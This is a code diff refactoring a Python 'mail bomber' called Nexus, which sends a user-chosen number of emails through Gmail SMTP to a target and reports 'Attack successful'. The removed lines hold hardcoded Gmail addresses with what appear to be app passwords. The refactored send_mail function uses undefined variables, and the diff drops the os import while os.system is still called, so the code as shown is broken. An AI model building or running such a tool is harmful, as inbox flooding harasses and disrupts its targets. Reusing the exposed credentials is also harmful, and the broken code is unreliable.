@@ -1,36 +1,32 @@
-import os, smtplib, sys
+import smtplib
+import sys
 from random import choice
+
 from termcolor import colored as cl
 from pyfiglet import figlet_format as ff
 
-os.system('clear')
+from email_account import EmailAccount
+from email_accounts import ACCOUNTS
 
-email_accounts = ['servicerender100@gmail.com', 'servicerender200@gmail.com']
-email_passwords = ['uogr hlfp gpxl vmln', 'nytd nuae zeed kbkq'][::-1]
 
-def get_email_for_spam(eaccs):
-    email_address = choice(eaccs)
-    return email_address
+def get_rand_account() -> EmailAccount:
+    """
+    Return a randomly selected e-mail account from the
+    hardcoded accounts in email_accounts.py.
+    """
+    return choice(ACCOUNTS)
 
-ma = get_email_for_spam(email_accounts)
-password = email_passwords[email_accounts.index(ma)]
+def send_mail(account: EmailAccount, message: str) -> None:
+    obj = smtplib.SMTP('smtp.gmail.com', 587)
+    obj.starttls()
+    try:
+        obj.login(ma, pa)
+    except:
+        print(cl('Unexpected error from our side, sorry for the inconvenience', 'red'))
+    obj.sendmail(ma, acc, msg)
+    obj.quit()
+    print(cl(f'Mail {str(i+1)} sent successfully ☑', 'green'))
 
-def send_mail(acc, qty, msg, ma, pa):
-    for i in range(qty):
-        obj = smtplib.SMTP('smtp.gmail.com', 587)
-        obj.starttls()
-        try:
-            obj.login(ma, pa)
-        except:
-            print(cl('Unexpected error from our side, sorry for the inconvenience', 'red'))
-        obj.sendmail(ma, acc, msg)
-        obj.quit()
-        print(cl(f'Mail {str(i+1)} sent successfully ☑', 'green'))
-
-print(cl('-'*30, 'red'))
-print(cl(ff('Nexus')+'\n\t-A mail bomber program.\n\t-An AYLIT Production.\n\t-v1.0', 'red'))
-print(cl('-'*30, 'red'))
-print('\n')
 
 try:
     mails_to_be_sent = int(input(cl('No of mails to be sent:', 'red')).strip())
@@ -44,10 +40,6 @@ print(cl('-'*10+'\nAttack successful', 'green'))
 os.system('clear')	
     
 while True:
-    print(cl('-'*30, 'red'))
-    print(cl(ff('Nexus')+'\n\t-An AYLIT Production\n\t-v1.0', 'red'))
-    print(cl('-'*30, 'red'))
-    print('\n')
     if input(cl('Quit(y/n)? ', 'red')).lower().strip() == 'n':
         try:
             mails_to_be_sent = int(input(cl('No of mails to be sent:', 'red')).strip())
